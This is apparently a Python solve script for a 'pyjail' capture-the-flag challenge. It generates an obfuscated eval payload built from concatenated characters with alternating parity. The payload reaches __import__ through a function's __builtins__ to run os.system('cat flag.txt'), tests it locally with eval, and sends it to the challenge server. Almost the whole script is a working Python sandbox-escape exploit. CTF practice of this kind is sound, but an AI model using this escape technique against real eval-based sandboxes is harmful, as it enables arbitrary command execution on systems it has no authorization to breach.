from CTF_Library import *

def get_parity(s: str):
	par = ""
	for c in s:
		if c == "_":
			par += "?"
		else:
			par += str(ord(c) % 2)
	return par
def report(word: str):
	print(word.encode())
	print(get_parity(word))
	print()

for word in ["\'", "\"", "eval", "exec", " ", "+", "=", "#", ",", ";", "\n"]:
	report(word)

def construct(obj : str):
	n = len(obj)

	res = ""
	par = 0
	for i, c in enumerate(obj):
		target = c
		if ord(target[0]) % 2 == 0:
			target = "\'" + target + "\'"
		else:
			target = "\"" + target + "\""

		# insert space
		if par != ord(target[0]) % 2:
			if par == 0:
				res += " "
			else:
				res += "\t"
			par ^= 1

		# insert target
		res += target
		par ^= 1

		if i != n - 1:
			if par == 0:
				res += " "
				par ^= 1

			res += "+"
			par ^= 1
	return res

obj = "f.__builtins__[\'__import__\'](\"os\").system(\"cat flag.txt\")"
code = construct(obj)
report(code)

print(code)
f = lambda: None
print("-------------------")
eval("f.__builtins__[\'__import__\'](\"os\").system(\"cat flag.txt\")", {"__builtins__": None, 'f': f})
print("-------------------")
eval(b' \'f\' + \'.\' +"_"+"_"+ \'b\' +"u"+"i"+ \'l\' + \'t\' +"i"+ \'n\' +"s"+"_"+"_"+"["+"\'"+"_"+"_"+"i"+"m"+ \'p\' +"o"+ \'r\' + \'t\' +"_"+"_"+"\'"+"]"+ \'(\' + \'"\' +"o"+"s"+ \'"\' +")"+ \'.\' +"s"+"y"+"s"+ \'t\' +"e"+"m"+ \'(\' + \'"\' +"c"+"a"+ \'t\' + \' \' + \'f\' + \'l\' +"a"+"g"+ \'.\' + \'t\' + \'x\' + \'t\' + \'"\' +")"'.decode(), {"__builtins__": None, 'f': f})
print("-------------------")

for i, c in enumerate(code):
	assert c == "_" or ord(c) < 128 and i % 2 == ord(c) % 2

nc = remote("challs3.pyjail.club", 9328)

print(nc.recvuntil(b"> ").decode())
nc.sendline(code.encode())
for _ in range(40):
	print(nc.recvline().decode())

"""
f.__builtins__['__import__']("os").system("cat flag.txt")
"""